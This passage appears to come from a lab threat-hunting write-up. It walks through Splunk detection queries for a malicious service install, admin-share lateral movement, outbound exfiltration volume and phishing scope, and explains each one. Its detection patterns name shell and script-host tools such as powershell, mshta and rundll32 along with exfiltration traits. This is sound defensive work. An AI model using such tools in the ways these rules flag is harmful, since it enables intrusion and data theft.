| eval score=if(match(ImagePath,"(?i)\\\\(temp|appdata|programdata|users\\\\public|perflogs)\\\\"), score+4, score)
| eval score=if(match(fname,"(?i)^(cmd|powershell|pwsh|wscript|cscript|mshta|rundll32|regsvr32)\\.exe"), score+5, score)
| eval score=if(isnotnull(AccountName) AND NOT match(AccountName,"(?i)^(LocalSystem|NT AUTHORITY\\\\|.+\\$)"), score+2, score)
| eval score=if(match(StartType,"(?i)demand"), score+1, score)
| where score>=6
| eval stage="execution_persistence", mitre="T1543.003,T1036.005,T1569.002"
| table _time ComputerName EventCode ServiceName ImagePath StartType AccountName score stage mitre
```

**logic:**

Sysmon shows the process, but not the story. When a service starts something, Sysmon records the parent as services.exe -  useless every service on the box runs under it, so the trail stops at a legitimate Windows process.

7045 fills the gap. It tells us the service was named WindowsUpdateSvc (fake — the real one is wuauserv), that it ran C:\Windows\Temp\wuhelper.exe, and that adm-mrogers registered it at 14:48. That last part is the pivot: an admin account installing a service is a credential question, and the timestamp tells us exactly where to look in the logon data.

It uses an allowlist, not a blocklist. NOT match(ImagePath, "^[a-z]:\\(windows\\system32|program files)") asks whether the binary lives where service binaries legitimately live.

### Alert 4 — Admin-share access paired with a fresh NTLM logon

The piece the earlier version of this hunt was missing — now that 5140 is in the data, this doesn't have to stay an inference.

## splunk query:

```sql
index=hunt_lab sourcetype=wineventlog:security:json EventCode=5140 ShareName="\\\\*\\ADMIN$"
| eval stage="lateral_movement", mitre="T1021.002"
| table _time host SubjectUserName IpAddress ShareName ShareLocalPath stage mitre
```

**logic:**

`ADMIN$`/`C$` access is the classic remote-execution delivery path (PsExec-style tooling, or plain `net use`.) On its own it's routine on any Windows host, paired with a Type-3 NTLM logon in the same second and a 7045 in the same minute, it's a very strong single confirmation in this chain.

**ATT&CK:** T1021.002 - Remote Services: SMB/Windows Admin Shares.

### Alert 5 — Outbound transfer ratio anomaly

## splunk query:

```sql
index=hunt_lab sourcetype=fortigate action=accept
| where NOT cidrmatch("10.0.0.0/8",dstip) AND NOT cidrmatch("172.16.0.0/12",dstip) AND NOT cidrmatch("192.168.0.0/16",dstip)
| stats sum(sentbyte) as sent sum(rcvdbyte) as rcvd count as sessions by srcip dstip dstport
| eval sent_mb=round(sent/1048576,2), ratio=round(sent/(rcvd+1),1)
| where sent_mb>5 AND ratio>3
| eval stage="exfiltration", mitre="T1041"
| table srcip dstip dstport sessions sent_mb ratio stage mitre
| sort - sent_mb
```

No IOC anywhere in this logic — no hash, domain, filename, process. It catches the physics of exfiltration: data leaving in bulk, which no attacker avoids while actually stealing data. 
FS01 → 203.0.113.133 scores ratio ~23,524:1; 
WKS01's beacon scores ~0.5 and correctly doesn't fire - that traffic is command, not theft.

**Possible Tuning:** allowlist backup servers, cloud sync, CI/CD and log shippers by destination *and* source together. A file server or DC showing up here uninvited is always worth a look.

**ATT&CK:** T1041 - Exfiltration Over C2 Channel.

---

## Final scoping checks

**Was anyone else phished?**

## splunk query:

```sql
index=hunt_lab sourcetype=sysmon:json EventCode=11
| where match(TargetFilename,"(?i)Content\.Outlook")
| stats count values(TargetFilename) as files by host User
```

Only one Outlook cache write in the whole dataset - one recipient, not a campaign.



